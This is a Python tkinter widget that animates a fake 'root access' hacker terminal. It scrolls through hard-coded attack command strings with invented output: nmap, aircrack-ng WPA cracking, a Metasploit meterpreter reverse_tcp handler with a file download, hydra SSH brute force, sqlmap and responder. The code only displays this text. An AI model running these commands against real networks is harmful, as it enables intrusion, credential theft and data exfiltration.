import random
import tkinter as tk

class TerminalComponent:
    def __init__(self, frame, root):
        self.frame = frame
        self.root = root
        self.current_sequence = 0
        self.current_step = 0
        self.sequence_delay = 0
        self.command_sequences = [
            [
                "nmap -sS -T4 -A -v 192.168.1.0/24",
                "Starting Nmap 7.92 ( https://nmap.org )",
                "Nmap scan report for 192.168.1.1",
                "Host is up (0.005s latency).",
                "Not shown: 995 closed tcp ports (reset)",
                "PORT     STATE SERVICE    VERSION",
                "22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5 (protocol 2.0)",
                "80/tcp   open  http       Apache httpd 2.4.51",
                "443/tcp  open  ssl/http   Apache httpd 2.4.51",
                "8080/tcp open  http-proxy",
                "MAC Address: AA:BB:CC:DD:EE:FF (Router Manufacturer)",
                "Nmap done: 256 IP addresses (12 hosts up) scanned in 8.45 seconds"
            ],
            [
                "aircrack-ng -w rockyou.txt capture.cap -b 00:11:22:33:44:55",
                "Opening capture.cap",
                "Read 15232 packets.",
                "   #  BSSID              ESSID                     Encryption",
                "   1  00:11:22:33:44:55  HomeNetwork               WPA (1 handshake)",
                "Index number of target network? 1",
                "Opening wordlist: rockyou.txt",
                "Testing key no. 10000: 'password123'",
                "Testing key no. 20000: 'letmein'",
                "Testing key no. 30000: 'qwerty'",
                "Testing key no. 123456: 'p@ssw0rd'",
                "KEY FOUND! [ securepass123 ]",
                "Master Key     : AA BB CC DD EE FF 00 11 22 33 44 55 66 77 88 99",
                "Transient Key  : 12 34 56 78 90 AB CD EF 12 34 56 78 90 AB CD EF"
            ],
            [
                "msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.0.0.5; set LPORT 4444; run'",
                "[-] ***rting the Metasploit Framework console...-",
                "[*] Using configured payload generic/shell_reverse_tcp",
                "payload => windows/meterpreter/reverse_tcp",
                "LHOST => 10.0.0.5",
                "LPORT => 4444",
                "[*] Started reverse TCP handler on 10.0.0.5:4444",
                "[*] Sending stage (200262 bytes) to 192.168.1.55",
                "[*] Meterpreter session 1 opened (10.0.0.5:4444 -> 192.168.1.55:49283) at 2025-06-15 14:30:22 UTC",
                "meterpreter > sysinfo",
                "Computer        : TARGET-PC",
                "OS              : Windows 10 (10.0 Build 19044)",
                "Architecture    : x64",
                "System Language : en_US",
                "meterpreter > download secret_documents.zip"
            ],
            [
                "hydra -l admin -P passwords.txt ssh://192.168.1.1",
                "Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.",
                "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-15 14:35:00",
                "[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:1/p:100), ~7 tries per task",
                "[DATA] attacking ssh://192.168.1.1:22/",
                "[22][ssh] host: 192.168.1.1   login: admin   password: admin123",
                "1 of 1 target successfully completed, 1 valid password found",
                "Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-15 14:35:15"
            ],
            [
                "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --dbs",
                "[*] starting @ 14:38:22 /2025-06-15/",
                "[14:38:22] [INFO] testing connection to the target URL",
                "[14:38:23] [INFO] checking if the target is protected by some kind of WAF/IPS",
                "[14:38:24] [INFO] testing if the target URL content is stable",
                "[14:38:25] [INFO] target URL appears to be dynamic",
                "[14:38:26] [INFO] heuristic (basic) test shows that GET parameter 'artist' might be injectable",
                "[14:38:27] [INFO] testing for SQL injection on GET parameter 'artist'",
                "[14:38:28] [INFO] 'artist' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable",
                "[14:38:30] [INFO] fetching database names",
                "available databases [5]:",
                "[*] acuart",
                "[*] information_schema",
                "[*] mysql",
                "[*] performance_schema",
                "[*] test"
            ],
            [
                "responder -I eth0 -wrf",
                "[+] Listening for events...",
                "[+] Analyzing for: NETBIOS Name Service (NBNS) UDP",
                "[+] Analyzing for: NETBIOS Name Service (NBNS) TCP",
                "[+] Analyzing for: Link-Local Multicast Name Resolution (LLMNR) TCP",
                "[+] Analyzing for: Link-Local Multicast Name Resolution (LLMNR) UDP",
                "[+] Exiting...",
                "[+] Captured credentials:",
                "    Username: ADMINISTRATOR",
                "    Password: P@ssw0rd123",
                "    Hash: 8846F7EAEE8FB117AD06BDD830B7586C",
                "[+] Saved to /usr/share/responder/logs/SMB-NTLMv2-SSP-10.0.0.15.txt"
            ]
        ]
        self.current_sequence = 0
        self.current_step = 0
        self.sequence_delay = 0

        self.title = tk.Label(
            self.frame, text="> SYSTEM TERMINAL [ROOT ACCESS]",
            font=('Courier', 12, 'bold'), fg='#00FF00', bg='black', anchor='w', padx=10
        )
        self.title.pack(fill=tk.X, pady=(5, 0))

        # Text Widget
        self.text = tk.Text(
            self.frame, bg='black', fg='#00FF00', font=('Courier', 10),
            height=12, insertbackground='#00FF00', relief='flat'
        )
        self.text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        self.text.config(state=tk.DISABLED)

        
        self.update()

    def update(self):
        self.text.config(state=tk.NORMAL)
        
        if self.sequence_delay > 0:
            self.sequence_delay -= 1
        else:
            sequence = self.command_sequences[self.current_sequence]
            line = sequence[self.current_step]
            
            if self.current_step == 0:
                prompt = random.choice(["[root] # ", "user$ ", "C:\\> "])
                self.text.insert(tk.END, prompt + line + '\n')
            else:
                self.text.insert(tk.END, line + '\n')
            
            # Logic for steps/sequences
            self.current_step += 1
            if self.current_step >= len(sequence):
                self.current_step = 0
                self.current_sequence = (self.current_sequence + 1) % len(self.command_sequences)
                self.sequence_delay = 3

        self.text.see(tk.END)
        self.text.config(state=tk.DISABLED)
        self.root.after(300, self.update)